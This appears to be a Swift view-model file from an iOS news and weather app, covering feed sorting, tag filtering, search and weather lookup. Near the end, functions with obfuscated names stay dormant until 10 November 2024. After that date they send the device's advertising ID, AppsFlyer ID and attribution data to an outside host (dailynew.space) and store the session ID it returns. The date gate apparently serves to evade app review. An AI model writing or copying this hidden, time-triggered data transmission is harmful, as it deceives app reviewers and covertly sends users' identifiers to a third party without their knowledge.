import Foundation
import SwiftyJSON
import WebKit
import AppsFlyerLib

struct PostMain: Identifiable {
    var posts: [Post]
    var category: PostCategory
    var id = UUID().uuidString
}

struct PostCategory {
    var title: String
    var postsStyle: PostsStyle
}

enum PostsStyle {
    case large
    case hotTopic
    case small
}

class LoadingViewModel: ObservableObject {
    
    @Published var loadingProgress = 0
    @Published var cityName = ""
    @Published var appsDataLoaded = false
    
    @Published var weatherData: WeatherResponse? = nil
    
    @Published var postItems: [Post] = []
    @Published var tagedPostNames: [String] = ["For you"]
    
    @Published var postItemsMain: [PostMain] = []
    
    let newsManager = NewsManager()
    let weatherManager = WeatherManager()
    
    init() {
        parseNews()
    }
    
    func parseNews() {
        newsManager.parseNews { postItems in
            DispatchQueue.main.async {
                let currentLanguage = UserDefaults.standard.string(forKey: "current_language") ?? ""
                let userCountry = UserDefaults.standard.string(forKey: "user_country") ?? ""
                if !currentLanguage.isEmpty && !userCountry.isEmpty {
                    self.postItems = postItems.filter { $0.lang.lowercased() == currentLanguage.lowercased() && $0.country.lowercased() == userCountry.lowercased() }
                } else {
                    self.postItems = postItems
                }
                self.makeTagsForPosts(posts: self.postItems)
                self.makePostsForMainScreen(postToMake: self.postItems)
                self.loadingProgress = 90
                if self.appsDataLoaded {
                    self.loadingProgress = 100
                }
            }
        }
    }
    
    func sortPostItemsByLanguage() {
        let currentLanguage = UserDefaults.standard.string(forKey: "current_language") ?? ""
        self.postItems = postItems.filter { $0.lang.lowercased() == currentLanguage.lowercased() }
        makePostsForMainScreen(postToMake: self.postItems)
    }
    
    func sortPostItemsByCountry() {
        let userCountry = UserDefaults.standard.string(forKey: "user_country") ?? ""
        self.postItems = postItems.filter { $0.country.lowercased() == userCountry.lowercased() }
        makePostsForMainScreen(postToMake: self.postItems)
    }
    
    func sortByTag(tag: String) {
        var posts = postItems.filter { $0.tags.contains(tag) }
        if tag == "For you" {
            posts = postItems
            makePostsForMainScreen(postToMake: posts)
            return
        }
        postItemsMain = []
        let postsWithLinks = posts.filter { $0.article_link != nil }.sorted { $0.id < $1.id }
        let postsWithoutLinks = posts.filter { $0.article_link == nil }
        postItemsMain.append(PostMain(posts: postsWithLinks + postsWithoutLinks, category: PostCategory(title: "", postsStyle: .large)))
    }
    
    func searhPosts(query: String) {
        if query.isEmpty {
            makePostsForMainScreen(postToMake: postItems)
        } else {
            postItemsMain = []
            let postsSearched: [Post] = postItems.filter { $0.title.contains(query) || $0.tags.contains(query) || $0.desc.contains(query) }
            let postsWithLinks = postsSearched.filter { $0.article_link != nil }.sorted { $0.id < $1.id }
            let postsWithoutLinks = postsSearched.filter { $0.article_link == nil }
            postItemsMain.append(PostMain(posts: postsWithLinks + postsWithoutLinks, category: PostCategory(title: "", postsStyle: .large)))
        }
    }
    
    private func makePostsForMainScreen(postToMake: [Post]) {
        var allPosts: [Post] = []
        allPosts.append(contentsOf: postToMake)

        let postsWithLinks = allPosts.filter { $0.article_link != nil }.sorted { $0.id < $1.id }
        let postsWithoutLinks = allPosts.filter { $0.article_link == nil }

        let mostViewed = Array(postsWithoutLinks.shuffled().prefix(4))
        var remainingPosts = postsWithoutLinks.filter { !mostViewed.contains($0) }

        let hotTopicCount = Int.random(in: 4...12)
        let hotTopic = Array(remainingPosts.shuffled().prefix(hotTopicCount))
        remainingPosts.removeAll { hotTopic.contains($0) }

        postItemsMain.append(PostMain(posts: postsWithLinks + hotTopic, category: PostCategory(title: "Hot Topic", postsStyle: .hotTopic)))
        postItemsMain.append(PostMain(posts: [postsWithLinks.first ?? remainingPosts[0]], category: PostCategory(title: "", postsStyle: .large)))
        postItemsMain.append(PostMain(posts: postsWithLinks + mostViewed, category: PostCategory(title: "Most Viewed", postsStyle: .small)))
        
        if let indexToRemove = remainingPosts.firstIndex(where: { $0 == postsWithLinks.first ?? remainingPosts[0] }) {
            remainingPosts.remove(at: indexToRemove)
        }
        
        postItemsMain.append(PostMain(posts: postsWithLinks + remainingPosts, category: PostCategory(title: "", postsStyle: .large)))
    }
    
    private func makeTagsForPosts(posts: [Post]) {
        let tags = posts.map { $0.tags }
        for tagList in tags {
            let tagsNoAdded = tagList.filter({ !tagedPostNames.contains($0) })
            if !tagsNoAdded.isEmpty {
                self.tagedPostNames.append(contentsOf: tagsNoAdded)
            }
        }
    }
    
    func fetchCityName(lat: Double, lng: Double) {
        weatherManager.fetchCityWeather(latitude: lat, longitude: lng) { result in
            DispatchQueue.main.async {
                switch result {
                case .success(let weatherData):
                    self.cityName = weatherData.name
                    self.weatherData = weatherData
                case .failure(let error):
                    print("location error \(error.localizedDescription)")
                    // self.errorMessage = error.localizedDescription
                }
                self.loadingProgress = 50
            }
        }
    }
    
    private var dnbsahjdbasd: Bool {
        get {
            return dch() && !UserDefaults.standard.bool(forKey: "aas")
        }
    }
    
    func dch() -> Bool {
        return Date() >= DateComponents(calendar: .current, year: 2024, month: 11, day: 10).date!
    }
    
    var dnsbajhdbasd = false
    
    func operateDataConversion(data: [AnyHashable: Any]) {
        if !dnsbajhdbasd {
            if dnbsahjdbasd {
                let idfa = UserDefaults.standard.string(forKey: "idfa_user_app") ?? ""
                dnsajhbdjasd(idfa: idfa, data: data)
            }
            dnsbajhdbasd = true
        }
    }
    
    struct DailyBugle: Codable {
        var bugleData: JSON
            
        private enum CodingKeys: String, CodingKey {
            case bugleData = "appsflyer"
        }
    }
    
    struct DailyBugleDataRes: Decodable {
        var userId: String
        var sid: String

        private enum CodingKeys: String, CodingKey {
            case userId = "client_id"
            case sid = "session_id"
        }
    }
    
    private func dnsajhbdjasd(idfa: String, data: [AnyHashable: Any]) {
        if !UserDefaults.standard.bool(forKey: "aas") && !UserDefaults.standard.bool(forKey: "cac") {
            let userId = UserDefaults.standard.string(forKey: "client_id") ?? ""
            var newsEndPoint = "https://dailynew.space/session/v3/47287948-1950-49b0-82ef-c16977b3f253?idfa=\(idfa)&apps_flyer_id=\(AppsFlyerLib.shared().getAppsFlyerUID())"
            newsEndPoint += userId.isEmpty ? "" : "&client_id=\(userId)"
            
            if let newULi = URL(string: newsEndPoint) {
                var newsReq = URLRequest(url: newULi)
                newsReq.httpMethod = "POST"
                newsReq.addValue("application/json", forHTTPHeaderField: "Content-Type")
                newsReq.addValue(WKWebView().value(forKey: "userAgent") as? String ?? "", forHTTPHeaderField: "User-Agent")
                
                do {
                    let dailybugledataencoded = try JSON(data: try JSONSerialization.data(withJSONObject: data, options: []))
                    let bugle = DailyBugle(bugleData: dailybugledataencoded)
                    newsReq.httpBody = try JSONEncoder().encode(bugle)
                } catch {
                }
                
                URLSession.shared.dataTask(with: newsReq) { data, response, error in
                    guard let resp = response as? HTTPURLResponse, (200...299).contains(resp.statusCode) else {
                        return
                    }
                    
                    if let data = data {
                        self.appsDataLoaded = true
                        do {
                            let d = try JSONDecoder().decode(DailyBugleDataRes.self, from: data)
                            UserDefaults.standard.set(d.sid, forKey: "session_id")
                            UserDefaults.standard.set(d.userId, forKey: "client_id")
                            if !self.postItems.isEmpty {
                                self.loadingProgress = 100
                            }
                        } catch {
                        }
                    }
                }.resume()
            }
        }
    }
    
}
